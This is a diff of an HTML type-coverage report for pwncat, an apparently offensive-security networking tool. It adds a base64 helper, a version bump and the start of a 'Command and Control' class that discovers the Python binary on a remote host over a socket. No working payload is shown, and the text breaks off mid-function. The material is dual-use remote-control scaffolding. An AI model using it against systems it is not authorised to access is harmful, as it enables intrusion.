+<span class="line-empty" title="No Anys on this line!">#  4. Transformer</span>
+<span class="line-empty" title="No Anys on this line!">#  5. IO modules</span>
+<span class="line-empty" title="No Anys on this line!">#  6. PSE Store</span>
+<span class="line-empty" title="No Anys on this line!">#  7. IO Runner</span>
+<span class="line-empty" title="No Anys on this line!">#  8. Command &amp; Control</span>
+<span class="line-empty" title="No Anys on this line!">#  9. Command line arguments</span>
+<span class="line-empty" title="No Anys on this line!"># 10. Main entrypoint</span>
 <span class="line-empty" title="No Anys on this line!">#</span>
 <span class="line-empty" title="No Anys on this line!"># How does it work?</span>
 <span class="line-empty" title="No Anys on this line!"># ------------------------------------</span>
@@ -3156,6 +3524,7 @@
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-precise" title="No Anys on this line!">import argparse</span>
 <span class="line-precise" title="No Anys on this line!">import atexit</span>
+<span class="line-precise" title="No Anys on this line!">import base64</span>
 <span class="line-precise" title="No Anys on this line!">import logging</span>
 <span class="line-precise" title="No Anys on this line!">import os</span>
 <span class="line-precise" title="No Anys on this line!">import re</span>
@@ -3183,7 +3552,7 @@ Explicit (x1)">ABC = ABCMeta("ABC", (object,), {"__slots__": ()})</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-precise" title="No Anys on this line!">APPNAME = "pwncat"</span>
 <span class="line-precise" title="No Anys on this line!">APPREPO = "https://github.com/cytopia/pwncat"</span>
-<span class="line-precise" title="No Anys on this line!">VERSION = "0.0.15-alpha"</span>
+<span class="line-precise" title="No Anys on this line!">VERSION = "0.0.16-alpha"</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># Default timeout for timeout-based sys.stdin and socket.recv</span>
 <span class="line-precise" title="No Anys on this line!">TIMEOUT_READ_STDIN = 0.1</span>
@@ -3208,13 +3577,13 @@ Explicit (x1)">ABC = ABCMeta("ABC", (object,), {"__slots__": ()})</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   1 / 8   D A T A   S T R U C T U R E   T Y P E S</span>
+<span class="line-empty" title="No Anys on this line!"># ###   1 / 10   D A T A   S T R U C T U R E   T Y P E S</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (1/9) DsRunnerAction</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (1/9) DsRunnerAction</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsRunnerAction(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for Action functions for the Runner class."""</span>
@@ -3272,7 +3641,7 @@ Explicit (x1)">ABC = ABCMeta("ABC", (object,), {"__slots__": ()})</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (2/9) DsRunnerTimer</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (2/9) DsRunnerTimer</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsRunnerTimer(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for Timer functions for the Runner class."""</span>
@@ -3344,7 +3713,7 @@ Explicit (x2)">        self.__kwargs = kwargs</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (3/9) DsSock</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (3/9) DsSock</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsSock(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for DsSock options."""</span>
@@ -3405,7 +3774,7 @@ Explicit (x2)">        assert type(udp) is bool, type(udp)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (4/9) DsIONetworkSock</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (4/9) DsIONetworkSock</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsIONetworkSock(DsSock):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for IONetwork socket options."""</span>
@@ -3431,7 +3800,7 @@ Explicit (x2)">        assert type(recv_timeout_retry) is int, type(recv_timeout
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (5/9) DsIONetworkCli</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (5/9) DsIONetworkCli</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsIONetworkCli(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for IONetwork client options."""</span>
@@ -3491,7 +3860,7 @@ Explicit (x2)">            assert type(i) is int, type(i)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (6/9) DsIONetworkSrv</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (6/9) DsIONetworkSrv</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsIONetworkSrv(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for IONetwork server options."""</span>
@@ -3554,7 +3923,7 @@ Explicit (x2)">            assert type(i) is int, type(i)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (7/9) DsTransformLinefeed</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (7/9) DsTransformLinefeed</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsTransformLinefeed(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for DsTransformLinefeed options."""</span>
@@ -3578,7 +3947,7 @@ Explicit (x2)">            assert type(i) is int, type(i)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (8/9) DsIOStdinStdout</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (8/9) DsIOStdinStdout</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsIOStdinStdout(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for IOStdinStdout options."""</span>
@@ -3609,7 +3978,7 @@ Explicit (x2)">            assert type(i) is int, type(i)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [1/8 DATA STRUCTURE TYPES]: (9/9) DsIOCommand</span>
+<span class="line-empty" title="No Anys on this line!"># [1/10 DATA STRUCTURE TYPES]: (9/9) DsIOCommand</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class DsIOCommand(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """A type-safe data structure for IOCommand options."""</span>
@@ -3655,13 +4024,13 @@ Explicit (x2)">            assert type(i) is int, type(i)</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   2 / 8   L I B R A R Y   C L A S S E S</span>
+<span class="line-empty" title="No Anys on this line!"># ###   2 / 10   L I B R A R Y   C L A S S E S</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [2/8 LIBRARY CLASSES]: (1/4) TraceLogger</span>
+<span class="line-empty" title="No Anys on this line!"># [2/10 LIBRARY CLASSES]: (1/4) TraceLogger</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class TraceLogger(logging.getLoggerClass()):  # type: ignore</span>
 <span class="line-empty" title="No Anys on this line!">    """Extend Python's default logger class with TRACE level logging."""</span>
@@ -3703,7 +4072,7 @@ Explicit (x2)">            self._log(self.LEVEL_NUM, msg, args, **kwargs)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [2/8 LIBRARY CLASSES]: (2/4) ColoredLogFormatter</span>
+<span class="line-empty" title="No Anys on this line!"># [2/10 LIBRARY CLASSES]: (2/4) ColoredLogFormatter</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class ColoredLogFormatter(logging.Formatter):</span>
 <span class="line-empty" title="No Anys on this line!">    """Custom log formatter which adds different details and color support."""</span>
@@ -3776,7 +4145,7 @@ Explicit (x2)">            self._log(self.LEVEL_NUM, msg, args, **kwargs)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [2/8 LIBRARY CLASSES]: (3/4) StringEncoder</span>
+<span class="line-empty" title="No Anys on this line!"># [2/10 LIBRARY CLASSES]: (3/4) StringEncoder</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class StringEncoder(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """Takes care about Python 2/3 string encoding/decoding.</span>
@@ -3818,9 +4187,14 @@ Explicit (x2)">            self._log(self.LEVEL_NUM, msg, args, **kwargs)</span>
 <span class="line-precise" title="No Anys on this line!">            return data.decode(self.__codec)</span>
 <span class="line-precise" title="No Anys on this line!">        return data  # type: ignore</span>
 <span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def base64_encode(self, data):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str) -&gt; str</span>
+<span class="line-empty" title="No Anys on this line!">        """Convert string into a base64 encoded string."""</span>
+<span class="line-precise" title="No Anys on this line!">        return self.decode(base64.b64encode(self.encode(data)))</span>
+<span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [2/8 LIBRARY CLASSES]: (4/4): StopSignal</span>
+<span class="line-empty" title="No Anys on this line!"># [2/10 LIBRARY CLASSES]: (4/4): StopSignal</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class StopSignal(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """Provide a simple boolean switch."""</span>
@@ -3850,13 +4224,13 @@ Explicit (x2)">            self._log(self.LEVEL_NUM, msg, args, **kwargs)</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   3 / 8   N E T W O R K</span>
+<span class="line-empty" title="No Anys on this line!"># ###   3 / 10   N E T W O R K</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [3/8 NETWORK]: (1/1) Sock</span>
+<span class="line-empty" title="No Anys on this line!"># [3/10 NETWORK]: (1/1) Sock</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class Sock(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """Provides an abstracted server client socket for TCP and UDP."""</span>
@@ -4389,13 +4763,13 @@ Explicit (x4)">        self.__log.info("Connected to %s:%d", addr, port)</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   4 / 8   T R A N S F O R M E R</span>
+<span class="line-empty" title="No Anys on this line!"># ###   4 / 10   T R A N S F O R M E R</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [4/8 TRANSFORM]: (1/2): Transform</span>
+<span class="line-empty" title="No Anys on this line!"># [4/10 TRANSFORM]: (1/2): Transform</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class Transform(ABC):  # type: ignore</span>
 <span class="line-empty" title="No Anys on this line!">    """Abstract class to for pwncat I/O transformers.</span>
@@ -4436,7 +4810,7 @@ Explicit (x4)">        self.__log.info("Connected to %s:%d", addr, port)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [4/8 TRANSFORM]: (2/2) TransformLinefeed</span>
+<span class="line-empty" title="No Anys on this line!"># [4/10 TRANSFORM]: (2/2) TransformLinefeed</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class TransformLinefeed(Transform):</span>
 <span class="line-empty" title="No Anys on this line!">    """Implement basic linefeed replacement."""</span>
@@ -4521,13 +4895,13 @@ Explicit (x4)">                self.log.debug("Replacing LF with CR")</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   5 / 8   I O   M O D U L E S</span>
+<span class="line-empty" title="No Anys on this line!"># ###   5 / 10   I O   M O D U L E S</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [5/8 IO]: (1/4): IO</span>
+<span class="line-empty" title="No Anys on this line!"># [5/10 IO]: (1/4): IO</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class IO(ABC):  # type: ignore</span>
 <span class="line-empty" title="No Anys on this line!">    """Abstract class to for pwncat I/O modules.</span>
@@ -4613,7 +4987,7 @@ Explicit (x4)">                self.log.debug("Replacing LF with CR")</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [5/8 IONetwork]: (2/4) IONetwork</span>
+<span class="line-empty" title="No Anys on this line!"># [5/10 IONetwork]: (2/4) IONetwork</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class IONetwork(IO):</span>
 <span class="line-empty" title="No Anys on this line!">    """Pwncat implementation based on custom Socket library."""</span>
@@ -4844,7 +5218,7 @@ Explicit (x4)">            self.log.info("Re-accepting new clients")</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [5/8 IOStdinStdout]: (3/4) IOStdinStdout</span>
+<span class="line-empty" title="No Anys on this line!"># [5/10 IOStdinStdout]: (3/4) IOStdinStdout</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class IOStdinStdout(IO):</span>
 <span class="line-empty" title="No Anys on this line!">    """Implement basic stdin/stdout I/O module.</span>
@@ -4956,7 +5330,7 @@ Explicit (x10)">        if not select.select([sys.stdin], [], [], self.__opts.in
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [5/8 IOCommand]: (4/4) IOCommand</span>
+<span class="line-empty" title="No Anys on this line!"># [5/10 IOCommand]: (4/4) IOCommand</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class IOCommand(IO):</span>
 <span class="line-empty" title="No Anys on this line!">    """Implement command execution functionality.</span>
@@ -5075,7 +5449,7 @@ Error (x2)">        self.log.trace(  # type: ignore</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   6 / 9   P S E   S T O R E</span>
+<span class="line-empty" title="No Anys on this line!"># ###   6 / 10   P S E   S T O R E</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
@@ -5155,13 +5529,13 @@ Explicit (x1)">        self.__store = None</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   7 / 9   R U N N E R</span>
+<span class="line-empty" title="No Anys on this line!"># ###   7 / 10   R U N N E R</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [7/9 IO RUNNER]: (1/1) Runner</span>
+<span class="line-empty" title="No Anys on this line!"># [7/10 IO RUNNER]: (1/1) Runner</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">class Runner(object):</span>
 <span class="line-empty" title="No Anys on this line!">    """Runner class that takes care about putting everything into threads."""</span>
@@ -5401,13 +5775,341 @@ Error (x2)">                    self.log.trace("Joining %s", self.__threads[key]
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   8 / 9   C O M M A N D   L I N E   A R G U M E N T S</span>
+<span class="line-empty" title="No Anys on this line!"># ###   8 / 10   C O M M A N D   A N D   C O N T R O L   M O D U L E S</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [8/9 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions</span>
+<span class="line-empty" title="No Anys on this line!"># [8/10 Command &amp; Control]: (1/2) CNC</span>
+<span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
+<span class="line-precise" title="No Anys on this line!">class CNC(object):</span>
+<span class="line-empty" title="No Anys on this line!">    """Command and Control base class."""</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    __PYTHON_PATHS = [</span>
+<span class="line-precise" title="No Anys on this line!">        "/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python2/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python2.7/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python3/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python3.5/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python3.6/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python3.7/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/usr/local/python3.8/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python2/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python2.7/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python3/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python3.5/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python3.6/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python3.7/bin",</span>
+<span class="line-precise" title="No Anys on this line!">        "/opt/python3.8/bin",</span>
+<span class="line-empty" title="No Anys on this line!">    ]</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    __PYTHON_VERSIONS = [</span>
+<span class="line-precise" title="No Anys on this line!">        "python",</span>
+<span class="line-precise" title="No Anys on this line!">        "python2",</span>
+<span class="line-precise" title="No Anys on this line!">        "python2.7",</span>
+<span class="line-precise" title="No Anys on this line!">        "python3",</span>
+<span class="line-precise" title="No Anys on this line!">        "python3.5",</span>
+<span class="line-precise" title="No Anys on this line!">        "python3.6",</span>
+<span class="line-precise" title="No Anys on this line!">        "python3.7",</span>
+<span class="line-precise" title="No Anys on this line!">        "python3.8",</span>
+<span class="line-empty" title="No Anys on this line!">    ]</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    __COLORS = {"yellow": "\x1b[33;21m", "reset": "\x1b[0m"}</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!">    # Properties</span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!">    @property</span>
+<span class="line-precise" title="No Anys on this line!">    def python(self):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: () -&gt; str</span>
+<span class="line-empty" title="No Anys on this line!">        """Discovered absolute Python remote path."""</span>
+<span class="line-precise" title="No Anys on this line!">        return self.__python</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">    @property</span>
+<span class="line-precise" title="No Anys on this line!">    def py3(self):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: () -&gt; bool</span>
+<span class="line-empty" title="No Anys on this line!">        """Is remote version Python3? Else it is Python2."""</span>
+<span class="line-precise" title="No Anys on this line!">        return self.__py3</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!">    # Constructor</span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-precise" title="No Anys on this line!">    def __init__(self, enc, fsend, frecv):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (StringEncoder, Callable[[str], None], Callable[[], Iterator[str]]) -&gt; None</span>
+<span class="line-empty" title="No Anys on this line!">        """Instantiate Command and Control class.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).</span>
+<span class="line-empty" title="No Anys on this line!">            fsend (func): Socket send function.</span>
+<span class="line-empty" title="No Anys on this line!">            frcev (func): Socket receive generator function.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Raises:</span>
+<span class="line-empty" title="No Anys on this line!">            FileNotFoundError: if remote Python binary path is not found.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        self.__enc = enc</span>
+<span class="line-precise" title="No Anys on this line!">        self.__fsend = fsend</span>
+<span class="line-precise" title="No Anys on this line!">        self.__frecv = frecv</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        if not self.__set_remote_python_path():</span>
+<span class="line-precise" title="No Anys on this line!">            self.print_info("No Python has been found. Aborting and handing over to current shell.")</span>
+<span class="line-precise" title="No Anys on this line!">            raise FileNotFoundError()</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!">    # Public Functions</span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-precise" title="No Anys on this line!">    def print_info(self, message=None, newline=True, erase=False):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (Optional[str], bool, bool) -&gt; None</span>
+<span class="line-empty" title="No Anys on this line!">        """Print a message to the local screen to inform the user.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            message (str): The message to print.</span>
+<span class="line-empty" title="No Anys on this line!">            newline (bool): Add a newline?</span>
+<span class="line-empty" title="No Anys on this line!">            erase (bool): Erase previously printed text on the same line.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        end = "\n" if newline else ""</span>
+<span class="line-precise" title="No Anys on this line!">        prefix = "{}[PWNCAT CnC]{} ".format(self.__COLORS["yellow"], self.__COLORS["reset"])</span>
+<span class="line-precise" title="No Anys on this line!">        if message is None:</span>
+<span class="line-precise" title="No Anys on this line!">            message = ""</span>
+<span class="line-precise" title="No Anys on this line!">            prefix = ""</span>
